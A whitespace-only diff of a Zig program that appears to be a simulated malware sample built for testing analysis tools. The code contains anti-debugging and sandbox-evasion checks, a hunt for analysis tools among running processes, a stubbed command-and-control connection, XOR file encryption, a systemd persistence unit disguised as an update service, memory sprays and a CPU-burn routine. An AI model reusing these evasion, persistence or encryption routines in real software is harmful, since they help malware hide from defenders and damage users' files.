@@ -27,16 +27,16 @@ fn checkDebugger() !void {
         // Check /proc/self/status for TracerPid
         const file = try std.fs.openFileAbsolute("/proc/self/status", .{});
         defer file.close();
-        
+
         var buf: [4096]u8 = undefined;
         const size = try file.read(&buf);
         const content = buf[0..size];
-        
+
         if (mem.indexOf(u8, content, "TracerPid:\t0") == null) {
             return MalwareError.DebuggerDetected;
         }
     }
-    
+
     // Timing-based anti-debug
     const start = std.time.milliTimestamp();
     var sum: u64 = 0;
@@ -45,7 +45,7 @@ fn checkDebugger() !void {
         sum += i;
     }
     const elapsed = std.time.milliTimestamp() - start;
-    
+
     if (elapsed > 100) {
         return MalwareError.DebuggerDetected;
     }
@@ -56,7 +56,7 @@ fn detectVirtualization() !void {
     var hostname_buf: [64]u8 = undefined;
     _ = try os.gethostname(&hostname_buf);
     const host_str = mem.sliceTo(&hostname_buf, 0);
-    
+
     const vm_indicators = [_][]const u8{
         "virtualbox",
         "vmware",
@@ -65,13 +65,13 @@ fn detectVirtualization() !void {
         "parallels",
         "sandbox",
     };
-    
+
     for (vm_indicators) |indicator| {
         if (std.ascii.indexOfIgnoreCase(host_str, indicator) != null) {
             return MalwareError.SandboxDetected;
         }
     }
-    
+
     // Check CPU count (VMs often have fewer)
     const cpu_count = try std.Thread.getCpuCount();
     if (cpu_count < 2) {
@@ -85,7 +85,7 @@ fn phoneHome(_: mem.Allocator) !void {
     _ = C2_DOMAIN;
     _ = C2_PORT;
     return; // Simulated for static analysis
-    
+
     // Original code would be:
     // const address = try net.Address.resolveIp(C2_DOMAIN, C2_PORT);
     // const stream = try net.tcpConnectToAddress(address);
@@ -121,31 +121,31 @@ const ProcessInfo = struct {
 fn enumProcesses(alloc: mem.Allocator) ![]ProcessInfo {
     var processes = std.ArrayList(ProcessInfo).init(alloc);
     defer processes.deinit();
-    
+
     if (builtin.os.tag == .linux) {
         var dir = try std.fs.openIterableDirAbsolute("/proc", .{});
         defer dir.close();
-        
+
         var it = dir.iterate();
         while (try it.next()) |entry| {
             const pid = std.fmt.parseInt(os.pid_t, entry.name, 10) catch continue;
-            
+
             const cmdline_path = try std.fmt.allocPrint(alloc, "/proc/{}/cmdline", .{pid});
             defer alloc.free(cmdline_path);
-            
+
             const cmdline_file = std.fs.openFileAbsolute(cmdline_path, .{}) catch continue;
             defer cmdline_file.close();
-            
+
             var cmd_buf: [256]u8 = undefined;
             const cmd_size = cmdline_file.read(&cmd_buf) catch continue;
-            
+
             try processes.append(.{
                 .pid = pid,
                 .name = cmd_buf[0..cmd_size],
             });
         }
     }
-    
+
     return processes.toOwnedSlice();
 }
 
@@ -153,14 +153,14 @@ fn enumProcesses(alloc: mem.Allocator) ![]ProcessInfo {
 fn encryptFile(path: []const u8, key: []const u8) !void {
     const file = try std.fs.cwd().openFile(path, .{ .mode = .read_write });
     defer file.close();
-    
+
     const file_size = try file.getEndPos();
     const contents = try allocator.alloc(u8, file_size);
     defer allocator.free(contents);
-    
+
     _ = try file.read(contents);
     xorEncrypt(contents, key);
-    
+
     try file.seekTo(0);
     try file.writeAll(contents);
 }
@@ -169,7 +169,7 @@ fn encryptFile(path: []const u8, key: []const u8) !void {
 fn installPersistence(exe_path: []const u8) !void {
     if (builtin.os.tag == .linux) {
         // Create systemd service
-        const service_content = 
+        const service_content =
             \\[Unit]
             \\Description=System Update Service
             \\After=network.target
@@ -182,10 +182,10 @@ fn installPersistence(exe_path: []const u8) !void {
             \\[Install]
             \\WantedBy=multi-user.target
         ;
-        
+
         const service_file = try std.fmt.allocPrint(allocator, service_content, .{exe_path});
         defer allocator.free(service_file);
-        
+
         const service_path = "/tmp/updater.service";
         const file = try std.fs.createFileAbsolute(service_path, .{});
         defer file.close();
@@ -199,13 +199,13 @@ fn memoryTricks() !void {
     const leaked = try allocator.alloc(u8, 1024 * 1024); // 1MB
     @memset(leaked, 0xFF);
     // Intentionally not freeing
-    
+
     // Stack spray
     var stack_spray: [8192]u8 = undefined;
     for (&stack_spray) |*byte| {
         byte.* = 0x90; // NOP
     }
-    
+
     // Heap spray
     var heap_sprays: [10]*[1024]u8 = undefined;
     for (&heap_sprays) |*spray| {
@@ -219,11 +219,11 @@ fn cpuBurn() void {
     const cpu_count = std.Thread.getCpuCount() catch 1;
     var threads: []std.Thread = allocator.alloc(std.Thread, cpu_count) catch return;
     defer allocator.free(threads);
-    
+
     for (threads) |*thread| {
         thread.* = std.Thread.spawn(.{}, burnCore, .{}) catch continue;
     }
-    
+
     for (threads) |thread| {
         thread.join();
     }
@@ -246,36 +246,36 @@ const allocator = gpa.allocator();
 
 pub fn main() !void {
     defer _ = gpa.deinit();
-    
+
     const stdout = std.io.getStdOut().writer();
     try stdout.print("Zig Test Binary for Analysis\n", .{});
-    
+
     // Anti-analysis checks
     checkDebugger() catch |err| {
         try stdout.print("Debugger detected: {}\n", .{err});
         return;
     };
-    
+
     detectVirtualization() catch |err| {
         try stdout.print("Virtualization detected: {}\n", .{err});
         return;
     };
-    
+
     // System information gathering
     const uname = os.uname();
     try stdout.print("System: {s} {s}\n", .{ uname.sysname, uname.machine });
-    
+
     // Environment check
     if (process.getEnvVarOwned(allocator, "SANDBOX") catch null) |_| {
         try stdout.print("Sandbox environment variable detected!\n", .{});
         return;
     }
-    
+
     // Process enumeration
     const processes = try enumProcesses(allocator);
     defer allocator.free(processes);
     try stdout.print("Found {} processes\n", .{processes.len});
-    
+
     // Check for analysis tools
     const analysis_tools = [_][]const u8{
         "wireshark",
@@ -285,7 +285,7 @@ pub fn main() !void {
         "x64dbg",
         "ollydbg",
     };
-    
+
     for (processes) |proc| {
         for (analysis_tools) |tool| {
             if (std.ascii.indexOfIgnoreCase(proc.name, tool) != null) {
@@ -294,22 +294,22 @@ pub fn main() !void {
             }
         }
     }
-    
+
     // Network communication attempt
     phoneHome(allocator) catch |err| {
         try stdout.print("Network error: {}\n", .{err});
     };
-    
+
     // Decrypt hidden payload
     try stdout.print("Hidden: {s}\n", .{&hidden_payload});
-    
+
     // Memory manipulation
     try memoryTricks();
-    
+
     // Command execution
     const args = try process.argsAlloc(allocator);
     defer process.argsFree(allocator, args);
-    
+
     if (args.len > 1) {
         if (mem.eql(u8, args[1], "--burn")) {
             cpuBurn();
@@ -319,10 +319,10 @@ pub fn main() !void {
             try encryptFile(args[2], &CRYPTO_KEY);
         }
     }
-    
+
     // Create some operations
     try asyncOperation();
-    
+
     try stdout.print("Program completed\n", .{});
 }
 
